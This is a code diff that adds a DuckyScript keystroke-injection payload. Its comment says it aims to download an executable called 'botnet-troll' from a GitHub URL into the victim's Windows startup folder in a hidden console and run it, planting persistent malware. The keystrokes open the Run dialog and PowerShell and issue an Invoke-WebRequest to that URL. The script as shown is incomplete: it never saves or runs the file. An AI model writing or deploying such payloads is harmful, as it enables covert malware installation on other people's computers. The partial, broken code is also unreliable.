@@ -1,0 +1,10 @@
+REM using duckyscript, download https://github.com/Hamy-os/botnet-troll/blob/main/main.exe?raw=true in a hidden console into the users shell:startup directory and run it 
+
+GUI r
+STRING shell:startup
+ENTER
+GUI r
+
+STRING powershell
+STRING 
+STRING Invoke-WebRequest -Uri "https://github.com/Hamy-os/botnet-troll/blob/main/main.exe?raw=true"
